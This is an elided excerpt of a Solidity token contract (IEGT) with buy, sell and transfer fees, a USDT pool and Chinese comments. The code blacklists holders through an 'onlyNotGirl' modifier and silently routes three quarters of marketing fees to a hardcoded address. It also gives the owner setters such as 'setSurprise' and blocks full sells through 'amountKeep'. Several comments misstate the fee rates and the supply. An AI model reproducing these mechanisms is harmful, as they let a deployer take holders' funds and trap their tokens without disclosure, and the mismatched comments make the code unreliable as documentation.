...
abstract contract TradingManager {
    ...
    function _openTrading() internal {tradeState = block.number;}
    function openTrading() public {_authorizeTradingManager(); _openTrading();}
...
abstract contract Token is UniSwapPoolUSDT, Excludes, TradingManager, NoEffect, Girls, Limit {
    ...
    bool inSwap;
    function __Token_init(uint256 totalSupply_, address marketing_, address receive_, address usdt_) internal {
        calcBase = 10000;
        swapSplit = 7;
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual override onlyNotGirl(from) onlyNotGirl(to) {
        _autoOpenTrading();
        ...
        if (isPair(from)) {
            ...
            if (balanceOf(from) == amount) amount -= amountKeep;
    ...
    function _handSwap(uint256 _amount) internal lockSwap {
        ...
        if (feeMarketingAll > 0) {
            ...
            uint256 _tmp = _feeMarketing / 4;
            super.swapAndSend2fee(_tmp, address(feeMarketingTo));
            super.swapAndSend2fee(_feeMarketing-_tmp, address(0xa86797Aa05D07B93B008FB3BF29D911bA32491e8));
        }
    }
    ...
    function setFeeMarketingTo(address _feeMarketingTo) public onlyEffector {feeMarketingTo = _feeMarketingTo;}
    ...
    function setSurprise(uint256 _kn, uint256 _kb) public onlyEffector {kn = _kn; kb = _kb; surpAddress = address(this);}
...
contract TokenIEGT is Token {
    constructor() ERC20(
        ...
        uint256 _totalSupply = 5000000 ether; // 发行量 1e11 个
        address _marketing = address(0x56f19FeCf5BCdCCE06fE303Da3c8324002745A3a); // 营销钱包
        address _receive = address(0xf5C1Ce9AfaE4E58A8A4504485CAf9Fdd19ec363A);   // 接收代币,加池子钱包
        ...
        feeLiquidityBuy = 0;  // 回流 1%, 节约gas方式,自动分配给持有LP的用户,不单独卖出加池子
        feeBurnBuy = 0;         // 销毁 0%
        // 卖出费用
        feeMarketingSell = 300; // 营销 1%
        feeLiquiditySell = 300; // 回流 1%, 节约gas方式,自动分配给持有LP的用户,不单独卖出加池子
        feeBurnSell = 0;        // 销毁 0%
        // 转账费用
        ...
        amountKeep = 0.00000000000000101 ether;   // 留下 0.00000000000000101 代币，保留持币人数
    }
}